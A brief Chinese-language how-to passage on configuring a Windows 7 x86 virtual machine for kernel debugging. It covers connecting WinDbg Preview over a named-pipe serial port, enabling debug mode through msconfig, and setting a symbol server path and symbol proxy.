填入字符串：\\\\.\\pipe\\Windows7x86(可以填入自己希望的管道命名，但是只能修改Windows7x86位置处) 下方选择该端是服务器，另一端是应用程序 I/O模式中，选择轮询时主动放弃 配置完成如下图所示配置Windows7 输入命令msconfig，点击引导，如图 点击高级选项，启用调试，波特率，如图配置WinDbg Preview 首先启动代理网络，用于解除GFW限制 设置WinDbg的符号服务器和本地缓存目录SRV*D:\\LocalSymbols*http://msdl.microsoft.com/download/symbols Attach to kernel-COM-能选的对勾都选上-填波特率-Port填\\\\.\\pipe\\Windows7x86 点击OK以调试虚拟机内核 设置WinDbg的符号服务器代理set _NT_SYMBOL_PROXY=代理服务器地址:端口号" } ]
